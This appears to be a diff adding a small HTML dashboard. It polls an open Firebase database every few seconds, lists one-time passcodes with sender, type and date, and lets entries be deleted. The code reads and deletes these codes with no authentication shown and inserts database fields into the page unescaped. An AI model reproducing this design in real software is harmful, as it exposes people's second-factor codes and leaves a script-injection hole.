@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD"
+      crossorigin="anonymous"
+    />
+
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
+      crossorigin="anonymous"
+    ></script>
+
+    <link
+      href="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.4.6/bootstrap-editable/css/bootstrap-editable.css"
+      rel="stylesheet"
+    />
+    <script src="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.4.6/bootstrap-editable/js/bootstrap-editable.min.js"></script>
+  </head>
+  <style>
+    .table > tbody > tr > td {
+      vertical-align: middle;
+    }
+  </style>
+  <body>
+    <table class="table table-striped table-dark">
+      <thead>
+        <tr>
+          <th scope="col">#</th>
+          <th scope="col">OTP</th>
+          <th scope="col">Sender</th>
+          <th scope="col">Type</th>
+          <th scope="col">Date</th>
+          <th scope="col">Remove</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+    <script>
+      function get_otps() {
+        $.ajax(
+          "https://sga-otp-default-rtdb.europe-west1.firebasedatabase.app/.json",
+          {
+            method: "get",
+
+            success: (data, text, xhr) => {
+              let i = 1;
+              $("tbody").html("");
+              for (const id in data) {
+                $("tbody").append(`
+                <tr>
+    <th scope="row">${i++}</th>
+    <td>${data[id].otp}</td>
+    <td>${data[id].sender}</td>
+    <td>${data[id].type}</td>
+    <td>${new Date(parseInt(data[id].date)).toLocaleDateString()} ${new Date(parseInt(data[id].date)).toLocaleTimeString()}</td>
+    <td>
+        <button onclick='remove("${id}")' class='btn btn-secondary'>remove</button>
+    </td>
+</tr>
+
+                `);
+              }
+            },
+            error: (xhr, text, error) => {
+              console.log(error);
+            },
+          }
+        );
+      }
+      setInterval(get_otps, 3000);
+      get_otps();
+
+      function remove(id) {
+        $.ajax(
+          `https://sga-otp-default-rtdb.europe-west1.firebasedatabase.app/${id}.json`,
+          { method: "delete", success: () => get_otps() }
+        );
+      }
+    </script>
+  </body>
+</html>
